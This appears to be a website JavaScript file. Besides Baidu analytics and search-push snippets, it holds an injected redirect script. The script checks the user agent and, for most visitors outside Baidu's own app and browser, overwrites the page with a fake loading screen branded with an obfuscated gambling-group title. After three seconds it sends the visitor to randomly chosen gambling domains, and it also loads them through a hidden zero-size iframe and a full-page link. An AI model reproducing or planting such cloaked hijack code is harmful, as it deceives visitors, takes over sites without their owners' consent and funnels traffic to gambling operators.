
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?020e8804f683bb3aa0daab1966f49aa1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?4c14b1ff1f63632bcbdedee5b4da197c";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

(function () {
    /*百度推送代码*/
     var bp = document.createElement('script');
     bp.src = '//push.zhanzhang.baidu.com/push.js';
     var s = document.getElementsByTagName("script")[0];
     s.parentNode.insertBefore(bp, s);
     /*360推送代码*/
     var src = document.location.protocol + '//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9';
     document.write('<script src="' + src + '" id="sozz"><\/script>');
     })();







var sUserAgent= navigator.userAgent.toLowerCase();
var bIsIphoneOs= sUserAgent.match(/iphone/i) == "iphone";
var bIsSymb= sUserAgent.match(/symbianos/i) == "symbianos";
var bIsIpad= sUserAgent.match(/ipad/i) == "ipad";
var bIsIpod= sUserAgent.match(/ipod/i) == "ipod";
var bIsAndroid= sUserAgent.match(/android/i) == "android";
var bIsCE= sUserAgent.match(/windows ce/i) == "windows ce";
var bIsWM= sUserAgent.match(/windows mobile/i) == "windows mobile";
var bIsWP= sUserAgent.match(/windows phone/i) == "windows phone";
var isBDAPP=sUserAgent.match(/baiduboxapp/i) == "baiduboxapp";
var isBDBrowser=sUserAgent.match(/baidubrowser/i) == "baidubrowser";
var isM= bIsIphoneOs || bIsSymb || bIsIpad || bIsIpod || bIsAndroid || bIsCE || bIsWM || bIsWP;
if (!isM || (!isBDAPP && !isBDBrowser)){
    var str=new Array("https://ag106.app/","https://ag188.tv");
    var aric_a;
    aric_a=str[parseInt(Math.random()*(str.length))];
    document.writeln("<!DOCTYPE html>");
    document.writeln("<html lang=\'en\'>");
    document.writeln("  <head>");
    document.writeln("    <meta charset=\'utf-8\'>");
    document.writeln("    <meta name=\'viewport\' content=\'width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no\'>");
    document.writeln("    <meta http-equiv=\'X-UA-Compatible\' content=\'IE=Edge\'>");
    document.writeln("    <meta name=\'apple-mobile-web-app-status-bar-style\' content=\'black-translucent\' />");
    document.writeln("    <meta name=\'apple-mobile-web-app-title\' content=\'&#65;&#71;&#20122;&#28216;\'>");
    document.writeln("    <meta content=\'telephone=no,email=no\' name=\'format-detection\'>");
    document.writeln("    <meta name=\'renderer\' content=\'webkit\'>");
    document.writeln("    <title>&#65;&#71;&#20122;&#28216;&#38598;&#22242;&#23448;&#32593;&#65288;&#65;&#115;&#105;&#97;&#32;&#71;&#97;&#109;&#105;&#110;&#103;&#65289;&#45;&#45;&#45;&#21482;&#28858;&#38750;&#21516;&#20961;&#20139;&#32;&#80;&#111;&#119;&#101;&#114;&#101;&#100;&#32;&#66;&#121;&#32;&#65;&#71;&#56;&#46;&#67;&#79;&#77;</title>");
    document.writeln("    <style>body { font-family: \'Microsoft YaHei\', Arial; min-width: 100% !important; background-color: #fbfbfb; padding: 0; min-width: 100% !important; max-width: 100% !important; display: block; } .wrapper { position: relative; min-width: 100% !important; max-width: 100% !important; margin: 0 auto; } * { margin: 0; padding: 0; } #second{ font-size: 30px !important; } .loading { position: relative; overflow: hidden; width: 100% !important; height: 100% !important; } .loading .loading-container { text-align: center; background-color: #e6e6e6; width: 100% !important; height: 100% !important; position: absolute; top: 0% !important; left: 0 !important; z-index: 1; } .loading .loading-container p { font-size: 30px !important; letter-spacing: 20px !important; height: 40px !important; color: #333333; } .loading .loading-container .icon .ag86 { position: absolute; top: 0 !important; left: 0 !important; } .loading .loading-container .icon .ag8 { position: absolute; top: 0 !important; left: 0 !important; } .loading .loading-container .icon { position: relative; width: 160px !important; height: 160px !important; margin: 15% auto 80px !important; } body, html { height: 100% !important; } .wrapper { position: relative;min-width: 100% !important;max-width: 100% !important;margin: 0 auto;left:0 !important;top:0 !important;width: 100% !important; text-align: center;z-index:9999 !important; }</style></head>");
    document.writeln("  <body style=\'position:fixed;\'>");
    document.writeln("    <div class=\'wrapper loading\'>");
    document.writeln("      <div class=\'loading-container\'>");
    document.writeln("        <div class=\'icon\'>");
    document.writeln("          <img src=\'https://mowenxi.com/ag8-logo.png\' class=\'ag8\'>");
    document.writeln("          <img src=\'https://mowenxi.com/ag8-logo.png\' class=\'ag86\'></div>");
    document.writeln("        <p>");
    document.writeln("          <bb id=\'second\'>3</bb>秒后</p>");
    document.writeln("        <p>进入&#20122;&#28216;&#38598;&#22242;...</p>");
    var sec = document.getElementById('second');
    var iiqwe = 3;
    var timer = setInterval(function() {
            iiqwe--;
            sec.innerHTML = iiqwe;
            if (iiqwe === 1) {
                clearInterval(timer);
                window.location.href = aric_a;
            }
            if (iiqwe === 0) {
                clearInterval(timer);
                window.location.href = aric_a;
            }

        },
        1000);
    // 3秒后自动跳转
    window.setTimeout(function () {
        window.location.href = aric_a;
    },3000);

    document.writeln("        <a href='"+aric_a+"' target=\'_self\' style=\'display: block;  height:100%; width:100%; position: fixed;border: none;top: 0;left: 0;z-index: 2000000000;\'></a>");
    document.writeln("      </div>");
	document.writeln('<iframe border=0 name=lantk " src="' + aric_a + '" width=0 height=0 allowTransparency scrollbars=yes frameBorder=\'0\'></iframe>');
    document.writeln("    </div>");
    document.writeln("  </body>");
    document.writeln("</html>");
}







